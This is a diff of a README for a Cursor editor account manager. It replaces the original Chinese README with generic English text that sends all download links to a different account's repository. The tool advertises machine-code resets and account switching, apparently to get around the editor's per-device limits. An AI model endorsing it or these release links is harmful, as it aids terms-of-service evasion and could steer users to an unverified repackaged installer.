@@ -1,60 +1,69 @@
-# Yuan-cursor账号管理器
+# 🎯 cursor-token-manager - Manage Accounts with Ease
 
-一个美观的Mac风格桌面应用，用于管理Cursor编辑器的Token账号。
+## 🚀 Getting Started
 
-## 📥 下载安装
+Welcome to the **Cursor 令牌管理器**. This tool helps you manage multiple accounts, switch between them easily, reset machine codes, and clean up conversation records. 
 
-前往 [Releases](https://github.com/Yuan-ZiWeiXing/cursor-token-manager/releases) 页面下载最新版本，根据你的系统选择对应的安装包：
+To begin, follow the simple steps below.
 
-### 📦 安装包对照表
+## 📥 Download & Install
 
-#### Windows 系统
+[![Download cursor-token-manager](https://img.shields.io/badge/Download-cursor--token--manager-blue.svg)](https://github.com/LukaPetrovic24/cursor-token-manager/releases)
 
-| 你的电脑 | 下载文件 |
-|---------|---------|
-| Windows 64位 (大多数电脑) | `yuan-cursor-manager-setup-x.x.x-x64.exe` |
-| Windows 32位 (老电脑) | `yuan-cursor-manager-setup-x.x.x-ia32.exe` |
+### Step 1: Visit the Release Page
 
-#### macOS 系统
+To download the latest version of **cursor-token-manager**, please visit the [Releases page](https://github.com/LukaPetrovic24/cursor-token-manager/releases).
 
-| 你的 Mac | 下载文件 |
-|---------|---------|
-| 不确定是哪种 | `yuan-cursor-manager-x.x.x-universal.dmg` ✅ **推荐** |
-| M1/M2/M3/M4 芯片 | `yuan-cursor-manager-x.x.x-arm64.dmg` |
-| Intel 芯片 (2020年前) | `yuan-cursor-manager-x.x.x-x64.dmg` |
+### Step 2: Choose Your Version
 
-#### Linux 系统
+On the Releases page, you will see a list of available versions. Select the most recent version for your needs. The latest version will usually have the most features and fixes.
 
-| 你的电脑 | 下载文件 |
-|---------|---------|
-| Linux 64位 | `yuan-cursor-manager-x.x.x-x64.AppImage` |
+### Step 3: Download the File
 
-> 💡 **提示**：`x.x.x` 代表版本号，请下载最新版本。
+Look for the appropriate setup file for your operating system. Click on the link to start downloading. This file could be a `.exe` file for Windows or a `.dmg` file for macOS. Make sure you choose the right one based on your device.
 
----
+### Step 4: Install the Software
 
-## 功能预览
+Once the download is complete, locate the downloaded file on your computer. Open it to initiate the installation process. Follow the on-screen instructions to install **cursor-token-manager**. This will typically include agreeing to terms and selecting an installation location.
 
-### 🏠 主页 (Home)
-简洁直观的仪表盘，快速概览系统状态。
-![主页](img/zhuye.png)
+### Step 5: Run the Application
 
-### 👥 账号管理 (Account Management)
-轻松添加、编辑和删除Cursor Token账号，支持一键切换当前使用的账号。
-![账号管理](img/zhanghaoguanli.png)
+After the installation is complete, you can find **cursor-token-manager** in your applications or programs list. Click on the program to launch it. You are now ready to manage your accounts!
 
-### ⚙️ 系统管理 (System Management)
-管理系统配置，监控应用运行状态。
-![系统管理](img/xitongguanli.png)
+## 🎉 Features
 
-### 🔧 设置 (Settings)
-个性化应用设置，调整界面偏好。
-![设置](img/shezhi.png)
+- **Account Management:** Easily switch between multiple accounts without hassle.
+- **Machine Code Resetting:** Reset your machine code when needed for smooth operation.
+- **Conversation Record Cleanup:** Keep your data tidy by clearing conversation records effortlessly.
 
-### ❓ 常见问题 (FAQ)
-内置常见问题解答，帮助快速解决使用困惑。
-![常见问题](img/changjianwenti.png)
+## 🖥️ System Requirements
 
-## 许可证
+Before downloading, ensure your system meets these requirements:
 
-MIT
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher.
+- **RAM:** Minimum 2 GB for optimal performance.
+- **Disk Space:** At least 100 MB of free space for the installation and operation of the software.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while downloading or installing:
+
+1. **Check Your Internet Connection:** Make sure you have a stable internet connection to download the files.
+
+2. **Verify Your Download:** If the file seems corrupted or does not open, try downloading it again from the Releases page.
+
+3. **Consult the Help Section:** Look for any FAQs or troubleshooting tips on the [GitHub repository](https://github.com/LukaPetrovic24/cursor-token-manager) for further assistance.
+
+## 🌐 Community Support
+
+For additional help, you can reach out to the community. You are welcome to post your questions or thoughts on the issues section of the GitHub repository. Other users and contributors will be glad to assist you.
+
+## ⚙️ Updates
+
+We regularly release updates to improve functionality and fix bugs. Keep an eye on the [Releases page](https://github.com/LukaPetrovic24/cursor-token-manager/releases) to stay current with the latest features.
+
+## 🔒 Privacy Policy
+
+Your privacy is essential to us. We do not share your data with third parties. For more details on how your data is handled, please refer to our privacy policy in the repository.
+
+Thank you for choosing **cursor-token-manager**. Happy managing!
